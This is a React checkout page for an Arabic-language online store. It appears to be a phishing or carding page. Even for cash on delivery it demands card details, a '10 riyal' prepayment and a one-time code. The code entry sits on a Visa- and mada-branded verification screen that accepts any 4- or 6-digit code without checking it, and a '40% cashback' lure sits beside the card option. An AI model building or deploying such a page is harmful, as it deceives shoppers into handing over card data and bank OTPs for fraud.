import { useState } from "react";
import { useCart } from "@/context/CartContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CheckCircle, ShoppingBag, ChevronLeft } from "lucide-react";
import { Link, useNavigate } from "react-router-dom";
import { base44 } from "@/api/base44Client";
import NaqiCardForm from "@/components/NaqiCardForm";

// OTP Step component (Visa-style)
function OtpStep({ phone, amount, onSuccess }) {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [resent, setResent] = useState(false);
  const [verifying, setVerifying] = useState(false);

  const submitOtp = (value) => {
    if (value.length < 4) {
      setError("يرجى إدخال رمز التحقق (4 أو 6 أرقام)");
      return;
    }
    setError("");
    setVerifying(true);
    setTimeout(() => {
      setVerifying(false);
      onSuccess();
    }, 1200);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    submitOtp(otp);
  };

  const handleResend = (e) => {
    e.preventDefault();
    setResent(true);
    setOtp("");
    setError("");
    setTimeout(() => setResent(false), 3000);
  };

  return (
    <div dir="rtl" className="min-h-screen flex items-center justify-center bg-gray-300 px-4">
      <div className="bg-white shadow-xl overflow-hidden" style={{ width: "360px", border: "1px solid #c8c8c8", borderRadius: "2px" }}>
        {/* Header */}
        <div className="flex items-center justify-between px-4 py-3 border-b" style={{ borderColor: "#ddd" }}>
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 750 471" className="h-7 w-auto">
            <path d="M278.2 334.7l35-207h56l-35 207h-56zM524.3 131.3c-11.1-4.2-28.5-8.7-50.2-8.7-55.3 0-94.3 28-94.6 68.2-.3 29.7 27.7 46.3 48.9 56.2 21.7 10.1 29 16.6 28.9 25.7-.1 13.9-17.3 20.2-33.3 20.2-22.3 0-34.1-3.1-52.4-10.7l-7.2-3.3-7.8 46c13 5.7 37 10.7 61.9 11 58.6 0 96.6-27.6 97-70.5.2-23.5-14.6-41.3-46.7-56-19.5-9.5-31.4-15.8-31.3-25.4 0-8.5 10.1-17.6 31.9-17.6 18.2-.3 31.4 3.7 41.7 7.8l5 2.3 7.6-45.2zM619.2 127.7H574c-13.8 0-24.1 3.8-30.1 17.7l-85.4 194.1h60.4l12-31.7h73.7l7 31.7h53.3l-46.7-211.8zm-70.9 135l22.7-58.7c-.3.5 4.7-12.2 7.6-20.1l3.8 18.1 13.2 60.7h-47.3zM232.8 127.7l-54.9 141.2-5.9-28.6c-10.2-33.2-42-69.3-77.5-87.4l50.1 181.8 59.2-.1 88.2-207h-59.2z" fill="#1a1f71"/>
            <path d="M131.3 127.7H43.1l-.7 4c69.6 17 115.7 58.1 134.8 107.5l-19.5-94.3c-3.4-13.3-13.3-16.8-26.4-17.2z" fill="#f9a533"/>
          </svg>
          <img src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/d4fe35008_image.png" alt="mada" className="h-8 w-auto object-contain" />
        </div>

        {/* Body */}
        <div className="px-6 py-6" dir="rtl">
          <h1 className="text-center font-bold text-gray-900 mb-2" style={{ fontSize: "16px" }}>التحقق من عملية الدفع</h1>
          <p className="text-center text-gray-600 text-sm leading-relaxed mb-3">
            لقد أرسلنا رمز التحقق إلى رقم هاتفك{" "}
            <span className="font-bold text-gray-800 dir-ltr" dir="ltr">{phone ? phone.replace(/(\d{3})(\d{3})(\d+)/, "$1 *** $3") : "05xxx"}</span>
          </p>
          <p className="text-center text-gray-700 text-xs leading-relaxed mb-5">
            أنت تفوّض دفع مبلغ <strong>10 ريال</strong> لتأكيد طلبك
          </p>

          <form onSubmit={handleSubmit}>
            <label className="block text-center text-gray-700 text-sm mb-3">رمز التحقق</label>
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              autoComplete="one-time-code"
              value={otp}
              onChange={e => {
                const val = e.target.value.replace(/\D/g, "").slice(0, 6);
                setOtp(val);
                setError("");
                if (val.length === 4 || val.length === 6) {
                  setTimeout(() => submitOtp(val), 300);
                }
              }}
              className={`w-full text-center py-3 px-3 outline-none transition-all border-2 rounded-sm text-xl font-bold tracking-widest ${
                error ? "border-red-400 bg-red-50" : otp ? "border-blue-500 bg-blue-50" : "border-gray-300 bg-white"
              }`}
              dir="ltr"
            />
            {error && (
              <p className="text-red-500 text-center text-xs mt-2 mb-1 font-semibold animate-pulse">
                ⚠️ {error}
              </p>
            )}

            <button
              type="submit"
              disabled={verifying}
              className="w-full py-2.5 text-white font-bold mt-4 transition-opacity hover:opacity-90 disabled:opacity-60"
              style={{ background: "#2563eb", borderRadius: "3px", fontSize: "15px" }}
            >
              {verifying ? "جاري التحقق..." : "تأكيد"}
            </button>
          </form>

          <div className="mt-4 text-center">
            {resent ? (
              <p className="text-green-600 text-sm">✓ تم إعادة إرسال الرمز بنجاح</p>
            ) : (
              <a href="#" onClick={handleResend} className="text-blue-600 hover:underline text-sm">
                إعادة إرسال الرمز
              </a>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

// Order Summary sidebar (reused in both steps)
function OrderSummary({ items, total }) {
  return (
    <div className="bg-card border border-border rounded-2xl p-6 sticky top-24">
      <h2 className="font-bold text-foreground text-lg border-b border-border pb-3 mb-4">ملخص الطلب</h2>
      <div className="space-y-3 max-h-80 overflow-y-auto mb-4">
        {items.map((item) => {
          const key = item.id || item.name_ar;
          return (
            <div key={key} className="flex gap-3 items-center">
              <img src={item.image_url} alt={item.name_ar} className="w-14 h-14 object-contain rounded-lg bg-muted shrink-0" />
              <div className="flex-1 min-w-0">
                <p className="text-xs font-medium text-foreground line-clamp-2 leading-tight">{item.name_ar}</p>
                <p className="text-xs text-muted-foreground mt-0.5">الكمية: {item.qty}</p>
              </div>
              <span className="text-sm font-bold text-foreground shrink-0">
                {((item.price || 0) * item.qty).toLocaleString("ar-SA")} ر.س
              </span>
            </div>
          );
        })}
      </div>
      <div className="border-t border-border pt-4 space-y-2">
        <div className="flex justify-between text-sm text-muted-foreground">
          <span>المجموع الفرعي</span>
          <span>{total.toLocaleString("ar-SA")} ر.س</span>
        </div>
        <div className="flex justify-between text-sm text-muted-foreground">
          <span>التوصيل</span>
          <span className="text-accent font-medium">مجاني</span>
        </div>
        <div className="flex justify-between font-black text-foreground text-lg border-t border-border pt-2 mt-2">
          <span>الإجمالي</span>
          <span>{total.toLocaleString("ar-SA")} ر.س</span>
        </div>
      </div>
    </div>
  );
}

export default function Checkout() {
  const { items, total, clearCart } = useCart();
  const navigate = useNavigate();
  const [step, setStep] = useState("form"); // "form" | "payment" | "otp" | "success"
  const [loading, setLoading] = useState(false);
  const [form, setForm] = useState({
    name: "", phone: "", city: "", address: "", notes: "",
    payment: "cod",
  });

  const set = (k, v) => setForm(f => ({ ...f, [k]: v }));

  const handleStep1 = (e) => {
    e.preventDefault();
    setStep("payment");
  };

  const saveOrder = async () => {
    await base44.entities.Order.create({
      name: form.name,
      phone: form.phone,
      city: form.city,
      address: form.address,
      notes: form.notes,
      payment: form.payment,
      total,
      items: items.map(i => JSON.stringify({ name_ar: i.name_ar, price: i.price, qty: i.qty, image_url: i.image_url })),
      status: "pending",
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (form.payment === "cod") {
      setLoading(true);
      await saveOrder();
      setLoading(false);
      setStep("otp");
      return;
    }
    setLoading(true);
    await saveOrder();
    setLoading(false);
    setStep("success");
    clearCart();
  };

  const handleOtpSuccess = () => {
    clearCart();
    setStep("success");
  };

  if (items.length === 0 && step !== "success") {
    return (
      <div dir="rtl" className="min-h-screen flex flex-col items-center justify-center gap-4 bg-background">
        <ShoppingBag className="w-16 h-16 text-muted-foreground/30" />
        <p className="text-muted-foreground font-medium">لا توجد منتجات في السلة</p>
        <Link to="/"><Button>العودة للمتجر</Button></Link>
      </div>
    );
  }

  if (step === "otp") {
    return <OtpStep phone={form.phone} amount={10} onSuccess={handleOtpSuccess} />;
  }

  if (step === "success") {
    return (
      <div dir="rtl" className="min-h-screen flex flex-col items-center justify-center gap-5 bg-background px-4">
        <div className="bg-card border border-border rounded-3xl p-10 flex flex-col items-center gap-5 max-w-md w-full text-center shadow-xl">
          <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center">
            <CheckCircle className="w-10 h-10 text-green-600" />
          </div>
          <h2 className="text-2xl font-extrabold text-foreground">تم استلام طلبك!</h2>
          <p className="text-muted-foreground text-sm leading-relaxed">
            شكراً لك على طلبك. سيتواصل معك فريقنا قريباً لتأكيد الطلب والتوصيل.
          </p>
          <div className="flex gap-2 items-center text-sm text-muted-foreground bg-muted/50 rounded-xl px-4 py-3 w-full justify-center">
            <span>📞</span>
            <span>920021500</span>
          </div>
          <Button onClick={() => navigate("/")} className="w-full h-11 font-bold rounded-xl">
            العودة للمتجر
          </Button>
        </div>
      </div>
    );
  }

  const stepNum = step === "form" ? 1 : 2;

  return (
    <div dir="rtl" className="min-h-screen bg-muted/30 py-8 px-4">
      <div className="max-w-5xl mx-auto">
        {/* Header */}
        <div className="flex items-center gap-3 mb-6">
          {step === "payment" ? (
            <button onClick={() => setStep("form")} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary transition-colors">
              <ChevronLeft className="w-4 h-4" />
              رجوع
            </button>
          ) : (
            <Link to="/" className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary transition-colors">
              <ChevronLeft className="w-4 h-4" />
              العودة
            </Link>
          )}
          <h1 className="text-2xl font-extrabold text-foreground">إتمام الطلب</h1>
        </div>

        {/* Step Indicator */}
        <div className="flex items-center gap-2 mb-8">
          {[{ n: 1, label: "بيانات التوصيل" }, { n: 2, label: "طريقة الدفع" }].map((s, i) => (
            <div key={s.n} className="flex items-center gap-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold transition-all ${stepNum >= s.n ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}>{s.n}</div>
              <span className={`text-sm font-medium hidden sm:block ${stepNum >= s.n ? "text-foreground" : "text-muted-foreground"}`}>{s.label}</span>
              {i < 1 && <div className={`h-0.5 w-8 sm:w-16 mx-1 transition-all ${stepNum > s.n ? "bg-primary" : "bg-border"}`} />}
            </div>
          ))}
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-5 gap-6">
          {/* Step 1: Delivery Info */}
          {step === "form" && (
            <form onSubmit={handleStep1} className="lg:col-span-3 space-y-5">
              <div className="bg-card border border-border rounded-2xl p-6 space-y-4">
                <h2 className="font-bold text-foreground text-lg border-b border-border pb-3">بيانات التوصيل</h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">الاسم الكامل *</label>
                    <Input required value={form.name} onChange={e => set("name", e.target.value)} placeholder="محمد أحمد" className="h-11" />
                  </div>
                  <div>
                    <label className="text-sm font-medium text-foreground mb-1.5 block">رقم الجوال *</label>
                    <Input required value={form.phone} onChange={e => set("phone", e.target.value)} placeholder="05xxxxxxxx" className="h-11" type="tel" />
                  </div>
                </div>
                <div>
                  <label className="text-sm font-medium text-foreground mb-1.5 block">المدينة *</label>
                  <Input required value={form.city} onChange={e => set("city", e.target.value)} placeholder="الرياض" className="h-11" />
                </div>
                <div>
                  <label className="text-sm font-medium text-foreground mb-1.5 block">العنوان التفصيلي *</label>
                  <Input required value={form.address} onChange={e => set("address", e.target.value)} placeholder="الحي، الشارع، رقم المبنى" className="h-11" />
                </div>
                <div>
                  <label className="text-sm font-medium text-foreground mb-1.5 block">ملاحظات (اختياري)</label>
                  <textarea
                    value={form.notes}
                    onChange={e => set("notes", e.target.value)}
                    placeholder="أي تعليمات خاصة..."
                    rows={3}
                    className="w-full border border-input bg-transparent rounded-md px-3 py-2 text-sm resize-none focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
                  />
                </div>
              </div>
              <Button type="submit" className="w-full text-base font-bold rounded-xl h-12">
                التالي: طريقة الدفع ←
              </Button>
            </form>
          )}

          {/* Step 2: Payment */}
          {step === "payment" && (
            <form onSubmit={handleSubmit} className="lg:col-span-3 space-y-5">
              <div className="bg-card border border-border rounded-2xl p-6 space-y-4">
                <h2 className="font-bold text-foreground text-lg border-b border-border pb-3">طريقة الدفع</h2>
                <div className="space-y-3">
                  {[
                    { value: "cod", label: "كاش عند الاستلام", icon: "cod_img", badge: null },
                    { value: "credit", label: "بطاقات ائتمانية", icon: null, badge: "كاش باك 40%" },
                  ].map(opt => (

                    <label key={opt.value} className={`flex items-center gap-4 p-4 rounded-xl border-2 cursor-pointer transition-all ${form.payment === opt.value ? "border-primary bg-primary/5" : "border-border hover:border-primary/40"}`}>
                      <input type="radio" name="payment" value={opt.value} checked={form.payment === opt.value} onChange={() => set("payment", opt.value)} className="accent-primary" />
                      {opt.icon === "cod_img" ? (
                        <img src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/5c886ed42_m2H7G6K9b1d3A0Z5.png" alt="كاش عند الاستلام" className="h-8 w-auto object-contain" />
                      ) : opt.icon ? (
                        <span className="text-xl">{opt.icon}</span>
                      ) : (
                        <div className="flex items-center gap-1">
                          <img src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/c14dab934_images1.png" alt="Visa Mastercard" className="h-6 w-auto object-contain" />
                        </div>
                      )}
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="font-medium text-foreground">{opt.label}</span>
                        {opt.badge && (
                          <span className="bg-destructive text-destructive-foreground text-xs font-bold px-2 py-0.5 rounded-full">{opt.badge}</span>
                        )}
                      </div>
                    </label>
                  ))}
                </div>

                <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 text-sm">
                  <p className="font-bold text-amber-800">⚠️ يُشترط دفع 10 ريال مقدماً عبر البطاقة لتأكيد الطلب، وتُخصم من الإجمالي عند التسليم.</p>
                </div>

                {/* Card Form - shown for both payment methods */}
                <NaqiCardForm />
              </div>

              <Button type="submit" disabled={loading} className="w-full text-base font-bold rounded-xl h-12">
                {loading ? "جاري إرسال الطلب..." : form.payment === "cod" ? "التالي: التحقق بـ OTP" : "تأكيد الطلب"}
              </Button>
            </form>
          )}

          {/* Order Summary */}
          <div className="lg:col-span-2">
            <OrderSummary items={items} total={total} />
          </div>
        </div>
      </div>
    </div>
  );
}